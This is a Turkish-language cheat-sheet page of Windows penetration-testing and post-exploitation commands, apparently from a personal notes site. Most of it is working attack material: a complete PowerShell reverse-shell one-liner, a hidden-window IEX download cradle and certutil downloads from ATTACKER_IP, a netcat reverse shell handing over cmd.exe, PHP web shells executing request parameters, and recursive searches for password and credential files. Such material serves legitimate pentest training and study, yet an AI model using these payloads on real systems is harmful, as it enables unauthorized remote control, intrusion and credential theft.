---
layout: page
title: Windows Genel Komutlar
permalink: /windows/general-commands/
---

# Windows Genel Komutlar

Penetration Testing ve Post-Exploitation sırasında kullanılan genel komutlar.

---

## 📁 Dosya Tarama & Keşif

### **Get-ChildItem - Dosyaları Recursively Tara**

```powershell
Get-ChildItem -Path . -Include * -File -Recurse -ErrorAction SilentlyContinue
```

**Ne Yapar?**
- `-Path .` → Mevcut dizinden başla
- `-Include *` → Tüm dosyaları dahil et
- `-File` → Sadece dosyaları göster (klasörleri değil)
- `-Recurse` → **Tüm alt klasörlere gir** (önemli!)
- `-ErrorAction SilentlyContinue` → Hata verirse sessiz kalsın

**Sonuç:** Mevcut dizin ve ALT klasörlerdeki TÜM dosyaları listeler.

---

### **Hassas Dosyaları Arama - Password Araması**

```cmd
findstr /si password *.txt *.xml *.ini *.config
```

**Ne Yapar?**
- `/si` → Büyük/küçük harf fark etmiyor, SAT dosyaları da ara
- `password` → "password" kelimesini ara
- `*.txt *.xml *.ini *.config` → Sadece bu dosya türlerinde ara

---

### **Daha Kapsamlı Password Araması**

```cmd
findstr /spin "password" *.*
```

**Ne Yapar?**
- `/spin` → Satır numarası göster (`/p`), büyük/küçük fark etmiyor (`/i`), SAT dosyalar (`/s`)
- `"password"` → Aradığın kelime
- `*.*` → TÜM dosya türlerinde ara

---

### **Dir Komutu ile Hızlı Tarama**

```cmd
dir /s *pass* == *cred* == *vnc* == *.config*
```

**Ne Yapar?**
- `/s` → Recursively (tüm alt klasörlere gir)
- `*pass*` → "pass" içeren dosyalar
- `*cred*` → "cred" içeren dosyalar
- `*vnc*` → "vnc" içeren dosyalar
- `*.config*` → Config dosyaları

**Sonuç:** Kırmızı bayrakları olan hassas dosyaları bulur.

---

## 🔧 Derleyici Bilgileri (Linux → Windows)

Windows için exploit derlemek gerekirse:

### **32-bit Exploit Derlemek:**
```bash
i686-w64-mingw32-gcc exploit.c -o exploit.exe
```

### **64-bit Exploit Derlemek:**
```bash
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
```

**Kural:** 
- `i686` = 32-bit Windows
- `x86_64` = 64-bit Windows

Hedef sistemin mimarisine göre seç!

---

## 🔍 Versiyon Kontrolü & Exploit Bulma

### **Windows Versiyon Bilgisini Al**

```powershell
Get-ComputerInfo | Select-Object WindowsVersion, OSBuildNumber, SystemManufacturer
```

veya

```cmd
ver
systeminfo | findstr /i "os"
```

### **Patch Bilgisini Al**

```powershell
Get-HotFix | Select-Object HotFixID, Description, InstalledOn | Sort-Object InstalledOn -Descending
```

### **Exploit Araması (Exploit-DB)**

```bash
searchsploit windows "OS Build Number"
# Örnek:
searchsploit windows "19045"
searchsploit --type shellcode windows
```

**Örnek İş Akışı:**
1. `systeminfo` → OS Build bulma
2. `Get-HotFix` → Kurulu patchleri görme
3. Exploit-DB'de "Windows Build XXXX" araması
4. uygun exploit'i indirip çalıştırma

---

## 🔴 Reverse Shell - PowerShell

### **PowerShell Reverse Shell (One-Liner)**

```powershell
$client = New-Object System.Net.Sockets.TCPClient("LHOST","LPORT");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =$sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**Ne Yapar?**
- Attacker IP'sine (`LHOST`) ve Port'una (`LPORT`) bağlan
- Gelen komutları çalıştır (`iex`)
- Sonuçları geri gönder
- Kalıcı olarak bağlantı sağla

**Kullanım (Attacker tarafında):**
```bash
nc -lvnp 4444
# Sonra target'ta yukarıdaki komutu çalıştır (LHOST ve LPORT'u değiştir)
```

**Örnek (Değişkenleri değiştirilmiş):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100","4444");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =$sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

---

## 🛡 PowerUp ile Yetki Yükseltme

PowerUp, hedef Windows makinedeki yerel ayrıcalık yükseltme zafiyetlerini tarar.

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

- `Import-Module .\PowerUp.ps1` → PowerUp modülünü yollar ve yükler
- `Invoke-AllChecks` → tüm checkleri çalıştırır
- `Invoke-ServiceAbuse`, `Invoke-TokenManipulation` gibi ek fonksiyonlarla daha fazla saldırı yüzeyi keşfedilir

Eğer hedefte PowerUp yoksa, attacker tarafında bir HTTP sunucusu açıp hedefe indirebilirsin:

```powershell
python -m http.server 8000
```

Hedefte:

```powershell
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/PowerUp.ps1')"
```

---

## 🔌 Netcat / nc64.exe

Netcat, ters ve ileri bağlantı kurmak için en yaygın kullanılan araçtır.

- `nc64.exe` → 64-bit Windows Netcat
- `nc.exe` → 32-bit Windows Netcat

Eğer hedefte netcat yoksa, öncelikle amacıma uygun sürümü karşı tarafa yükle:

```cmd
certutil -urlcache -f http://ATTACKER_IP/nc64.exe nc64.exe
```

veya

```cmd
certutil -urlcache -f http://ATTACKER_IP/nc.exe nc.exe
```

Ardından reverse shell başlatmak için:

```cmd
nc64.exe -e cmd.exe ATTACKER_IP 4444
```

veya

```cmd
nc.exe -e cmd.exe ATTACKER_IP 4444
```

Attacker tarafında listener:

```bash
nc -lvnp 4444
```

---

## 📁 Linux'ten Dosya Çekme

### CMD ile

```cmd
curl http://LINUX_IP/remote-file -o C:\Windows\Temp\downloaded.bin
```

Eğer `curl` yoksa:

```cmd
bitsadmin /transfer mydownloadjob /download /priority normal http://LINUX_IP/remote-file C:\Windows\Temp\downloaded.bin
```

### PowerShell ile

```powershell
Invoke-WebRequest -Uri http://LINUX_IP/remote-file -OutFile C:\Windows\Temp\downloaded.bin
```

veya

```powershell
Invoke-RestMethod -Uri http://LINUX_IP/remote-file -OutFile C:\Windows\Temp\downloaded.bin
```

---

## 🌐 PHP Web Shell - Windows Reverse Shell

### **PHP Web Shell (Query Execution)**

```php
<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
```

**Ne Yapar?**
- `$_GET['cmd']` → URL'den komut al
- `system()` → Komutu Windows'ta çalıştır
- Sonucu doğrudan ekrana yaz

**Kullanım:**
```
http://target.com/shell.php?cmd=whoami
http://target.com/shell.php?cmd=dir
http://target.com/shell.php?cmd=ipconfig
```

### **PHP Web Shell - Improved (Daha Güvenli)**

```php
<?php 
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>
```

**Geliştirilmiş Özellikler:**
- `$_REQUEST` → GET ve POST ikisini de kabul eder
- `<pre>` → Çıktı formatı daha okunabilir

**Kullanım:**
```
http://target.com/shell.php?cmd=whoami
http://target.com/shell.php?cmd=net%20user
```

---

## 📋 Hızlı Referans

| Görev | Komut |
|------|-------|
| Tüm dosyaları tara | `Get-ChildItem -Recurse -File` |
| Password ara | `findstr /spin "password" *.*` |
| Versiyon kontrol | `systeminfo \| findstr OS` |
| Patch listesi | `Get-HotFix` |
| Reverse Shell (PS) | `$client = New-Object...` |
| Web Shell (PHP) | `<?php system($_GET['cmd']); ?>` |

---

[← Windows Rehberi'ne Dön](/windows/)